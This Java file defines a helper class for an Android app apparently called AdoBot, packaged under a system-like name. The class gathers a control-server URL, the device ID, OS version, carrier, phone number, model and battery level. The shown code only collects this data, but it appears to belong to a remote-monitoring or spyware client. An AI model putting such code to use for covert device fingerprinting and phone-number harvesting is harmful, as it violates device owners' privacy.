package com.android.adobot;

import android.Manifest;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.Settings;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;

import static android.content.Context.BATTERY_SERVICE;

public class CommonParams {

    SharedPreferences prefs;
    private String server;
    private String uid;
    private String sdk;
    private String version;
    private String phone;
    private String provider;
    private String device;
    private String battery;

    public CommonParams(Context context) {
        prefs = context.getSharedPreferences(Constants.PACKAGE_NAME, Context.MODE_PRIVATE);
        server = prefs.getString(Constants.PREF_SERVER_URL_FIELD, Constants.DEVELOPMENT_SERVER);
        uid = Settings.Secure.getString(context.getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
        sdk = Integer.valueOf(Build.VERSION.SDK_INT).toString();
        version = Build.VERSION.RELEASE;

        TelephonyManager telephonyManager = ((TelephonyManager) context.getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE));
        provider = telephonyManager.getNetworkOperatorName();
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            phone = telephonyManager.getLine1Number();
        }
        device = Build.MODEL;

        BatteryManager bm = (BatteryManager)context.getApplicationContext().getSystemService(BATTERY_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            battery = String.valueOf(bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY));
        } else battery = "0";
    }

    public String getServer() {
        return this.server;
    }

    public String getUid() {
        return this.uid;
    }

    public String getSdk() {
        return this.sdk;
    }

    public String getVersion() {
        return version;
    }

    public String getPhone() {
        return phone;
    }

    public String getProvider() {
        return provider;
    }

    public String getDevice() {
        return device;
    }

    public String getBattery() {
        return battery;
    }
}
